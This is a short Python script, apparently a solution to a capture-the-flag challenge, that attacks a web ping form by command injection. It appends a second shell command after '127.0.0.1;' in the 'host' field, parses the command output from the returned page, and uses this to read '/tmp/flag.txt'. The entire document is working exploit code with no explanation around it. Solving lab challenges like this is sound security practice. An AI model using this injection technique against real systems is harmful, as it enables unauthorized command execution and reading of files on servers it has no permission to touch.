#!/usr/bin/env python3
import requests, re

BASE = 'https://dont-ping-l1-ctf.tdho.st'
s = requests.Session()

def run(cmd):
    r = s.post(BASE + '/', data={'host': f'127.0.0.1; {cmd}'}, timeout=10)
    pres = re.findall(r'<pre[^>]*>(.*?)</pre>', r.text, re.DOTALL)
    # Last pre has the command output
    if len(pres) > 1:
        return pres[-1].strip()
    return pres[0].strip() if pres else r.text[-500:]

print(run('cat /tmp/flag.txt'))
